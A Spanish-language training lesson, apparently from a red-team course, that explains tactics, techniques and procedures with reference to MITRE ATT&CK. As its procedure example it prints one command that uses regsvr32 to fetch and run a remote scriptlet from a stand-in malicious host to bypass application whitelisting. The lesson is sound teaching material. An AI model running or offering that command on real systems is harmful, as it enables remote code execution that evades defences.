## **¿Qué son los TTP?**

**TTP** representar **Tácticas, técnicas y procedimientos**. Estos son tres elementos jerárquicos utilizados para describir y categorizar el comportamiento de los actores de amenazas. Los TTP son fundamentales para las operaciones del Equipo Rojo, la inteligencia de amenazas y marcos como **MITRE ATT&CK**.

---

### [](https://redteamleaders.coursestack.com/courses/62c9b0f6-6a0a-488c-870b-4ca0ac754378/take/ttps-concept#user-content-1-tactics)**1. Tácticas**

- **El objetivo estratégico de un adversario.**
- Las tácticas representan **por qué** Un adversario está realizando una acción particular.
- Cada táctica define una fase en el ciclo de vida del ataque (por ejemplo, obtener acceso, mantener el control).
- **Ejemplos:**
    - Acceso inicial
    - Persistencia
    - Evasión de defensa
    - Comando y control
    - Exfiltración

---

### [](https://redteamleaders.coursestack.com/courses/62c9b0f6-6a0a-488c-870b-4ca0ac754378/take/ttps-concept#user-content-2-techniques)**2. Técnicas**

- **El método general utilizado para lograr la táctica.**
- Las técnicas describen **cómo** Un adversario logra un objetivo específico.
- Una táctica puede tener múltiples técnicas asociadas.
- **Ejemplos:**
    - Phishing con un archivo adjunto malicioso (Acceso inicial)
    - Carga lateral de DLL (evasión de defensa)
    - Tarea/trabajo programado (persistencia)

---

### [](https://redteamleaders.coursestack.com/courses/62c9b0f6-6a0a-488c-870b-4ca0ac754378/take/ttps-concept#user-content-3-procedures)**3. Procedimientos**

- **La implementación específica de una técnica en un escenario del mundo real.**
- Los procedimientos son los pasos, herramientas o comandos reales utilizados por un actor de amenazas.
- Varían según el adversario, las herramientas y el entorno.
- **Ejemplo:**
    - Un actor APT utiliza `regsvr32 /s /n /u /i:http://malicious.site/payload.sct scrobj.dll` para eludir la lista blanca de aplicaciones.

---

### [](https://redteamleaders.coursestack.com/courses/62c9b0f6-6a0a-488c-870b-4ca0ac754378/take/ttps-concept#user-content-why-ttps-matter)**Por qué son importantes los TTP**

- Los TTP proporcionan una **plano de comportamiento** sobre cómo operan los atacantes del mundo real.
- A diferencia de las firmas o los COI, los TTP se centran en **cómo** algo se hace, no sólo **qué** se utiliza.
- Se utilizan para:
    - Caza de amenazas
    - Emulación adversaria
    - Respuesta al incidente
    - Ingeniería de detección

---

### [](https://redteamleaders.coursestack.com/courses/62c9b0f6-6a0a-488c-870b-4ca0ac754378/take/ttps-concept#user-content-ttp-example-breakdown)**Desglose del ejemplo TTP**

|Capa|Descripción|
|---|---|
|**Táctica**|Evasión de defensa|
|**Técnica**|Ejecución de proxy binario firmado: Regsvr32|
|**Procedimiento**|Uso de regsvr32.exe con script remoto para ejecutar código de forma sigilosa|